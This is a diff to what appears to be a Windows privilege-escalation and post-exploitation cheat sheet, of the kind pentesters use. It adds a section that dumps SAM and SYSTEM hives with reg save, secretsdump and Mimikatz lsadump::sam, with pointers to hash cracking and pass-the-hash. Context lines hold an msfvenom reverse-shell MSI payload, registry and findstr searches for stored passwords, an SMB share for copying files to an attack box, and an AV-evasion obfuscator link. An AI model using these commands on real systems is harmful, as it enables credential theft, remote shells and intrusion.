@@ -54,7 +54,7 @@ https://lolbas-project.github.io/#
     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=53 -f msi -o reverse.msi /quiet /i reverse.msi
 ## Passwords
-    findstr /si password *.xml *.ini *.txt *.config 2>nul
+    findstr /si password *.xml *.ini *.txt *.config 2>nul 
 ### Saved creds
     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
     cmdkey /list
@@ -68,7 +68,21 @@ https://lolbas-project.github.io/#
     %SYSTEMROOT%\System32\config\SAM
     %SYSTEMROOT%\repair\system
     %SYSTEMROOT%\System32\config\SYSTEM
-    %SYSTEMROOT%\System32\config\RegBack\system
+    %SYSTEMROOT%\System32\config\RegBack\system 
+### Extracting SAM and SYSTEM 
+Manualy or use [mimikatz](https://github.com/gentilkiwi/mimikatz) 
+
+     reg.exe save HKLM\SAM sam.bak 
+     reg.exe save HKLM\SYSTEM system.bak 
+     *transfer files to attack box then dump* 
+     python3 /usr/local/bin/secretsdump.py -sam sam.bak -system system.bak LOCAL 
+
+Mimikatz: 
+     privilege::debug 
+     token::elevate 
+     lsadump::sam  
+     *then crack hashes or use pass the hash to login* [Online hash cracker](https://crackstation.net/) 
+
 ## Kernel exploits   
     systeminfo | findstr /B /C:"OS Name" /C:"OS Version"   
 ### Tools
@@ -160,17 +174,10 @@ Need to change /etc/proxychains4.conf socks4 to socks5 on attack box
      python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username USER -password PASS 
      net use \\IP\share /USER:USER PASS  
      copy FILE \\IP\share\FILE  
- ## Mimikatz
-     privilege::debug 
-     token::elevate 
-     lsadump::sam  
-     *then crack hashes or use pass the hash to login* [Online hash cracker](https://crackstation.net/) 
+
  ## AV Evasion 
      [PHP payload encoder](https://www.gaijin.at/en/tools/php-obfuscator#result) 
-     reg.exe save HKLM\SAM sam.bak 
-     reg.exe save HKLM\SYSTEM system.bak 
-     *transfer files to attack box then dump* 
-     python3 /usr/local/bin/secretsdump.py -sam sam.bak -system system.bak LOCAL 
+
      
  ____
  
